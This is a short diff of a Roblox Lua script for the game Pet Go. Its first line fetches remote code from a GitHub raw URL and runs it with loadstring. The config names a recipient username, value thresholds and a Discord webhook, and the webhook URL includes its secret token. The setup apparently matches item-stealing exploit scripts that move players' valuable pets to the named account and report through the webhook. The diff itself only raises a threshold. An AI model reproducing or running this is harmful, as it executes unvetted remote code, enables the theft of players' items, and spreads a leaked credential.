@@ -1,7 +1,7 @@
 loadstring(game:HttpGet('https://raw.githubusercontent.com/HuiScripts/PETGO2SRCSCR/refs/heads/main/SrcForPPL%20-%20PetGo.txt'))()
 Username = "AxolotlBestYo"
 min_rap = 1 
-min_chance = 2000000
+min_chance = 21000000
 webhook = "https://discord.com/api/webhooks/1296374904052256849/i0dX8LSN0ct3Q9Xjovk_Li-18hOXIlWeD5hmH7FraTUzIat8XGAeb54LyP-HFxp1BFmW"
 
 local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
